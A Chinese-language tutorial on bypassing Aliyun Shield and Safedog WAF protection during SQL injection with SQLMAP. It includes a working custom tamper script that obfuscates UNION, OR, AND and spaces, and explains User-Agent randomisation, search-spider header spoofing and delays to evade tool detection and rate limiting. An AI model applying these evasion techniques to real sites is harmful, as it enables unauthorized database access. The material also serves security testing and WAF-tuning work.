# 原创
：  WEB漏洞-SQL注入-利用SQLMAP工具绕过WAF

# WEB漏洞-SQL注入-利用SQLMAP工具绕过WAF
1. 访问使用阿里云搭建的网站（存在自带的阿里云盾）。1. 可以看到此时网站可以正常访问，可以进行正常注入。1. 使用工具进行注入。1. 可以看到在使用工具注入没多久后便返回了不存在注入点的信息。1. 因为经常会用到SQLMAP这款工具对注入点进行检测，在遇到WAF时，如果还想继续使用此工具，该怎么办呢？1. 此时我们就要用到SQLMAP的名为“tamper”（自带绕过脚本）的插件库了。1. 但是这些默认的脚本必然是不能绕过我们现在常见的一些WAF的（可以绕过一些比赛的拦截规则，如CTF比赛等）。1. 因此就需要我们自己来写脚本，在自己写脚本的过程中可以参考“tamper”下的脚本，可以对里面的脚本进行修改。1. 在tamper文件夹中创建rdog.py。
```
#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = retVal.replace('UNION', 'uNiOn/*/%0a*a*/')
        retVal = retVal.replace('DATABASE()', 'dataBase/*!(*/)')
        retVal = retVal.replace('DATABASE()', 'dataBase%23a%0a')
        retVal = retVal.replace('USER()', 'usEr/*!(*/)')
        retVal = retVal.replace(' ', '/**/')
        retVal = retVal.replace(" ", '%23a%0a')
        retVal = retVal.replace('OR', '/*!14400Or*/')
        retVal = retVal.replace('AND', '/*!14400aNd*/')

    return retVal
```
1. 利用我们刚刚书写的脚本再次进行注入。1. 可以看到最后注入结果依然不成功。1. 原因并不是脚本写的有问题，而是因为WAF上的一些设置。1. 我们抓取SQLMAP在运行过程中的数据包来进行分析。1. 可以看到数据包内的User-Agent中包含“sqlmap”字样。1. 在防护日志中可以看到拦截的原因是HTTP头部字段包含sqlmap字样。1. 在漏洞防护规则里可以看到包含一种名为“工具拦截”的检测类型，当其发现是使用sqlmap工具时，就会进行拦截。1. 当将User-Agent的值随便改为其它值时，可以看到网站可以正常进行访问。1. 此时可以在SQLMAP的命令里加入“--random-agent”参数，此参数的作用是使User-Agent后面的值按照其字典随机出现。1. 此时再次抓取数据包进行分析，可以看到User-Agent的值已经被成功更改。1. 继续运行SQLMAP，可以看到检测出了注入点。1. 获取表名。1. 可以看到SQLMAP工具成功跑出了数据库的表名。1. 接下来再次提高难度。1. 将安全狗的流量防护也打开。1. 打开此防护后安全狗会对过快访问的ip进行拦截。1. 将SQLMAP的缓存删除掉后，再次进行运行。（前面每次对此地址进行再次注入测试时，都先将缓存进行了删除，如果不进行删除，SQLMAP会无法成功进行注入）1. 再次运行SQLMAP。1. 可以看到SQLMAP运行到这时停止了。1. 此时访问网站，可以发现已经被拒绝访问了。1. 面对此种情况，有以下几种办法：1. 这里展示第三种办法（采用百度的指纹头）1. 在SQLMAP运行了一段时间后再次对网站进行访问，可以发现网站依然可以正常打开。1. 这里展示第二种方法（间隔1秒的延迟注入）。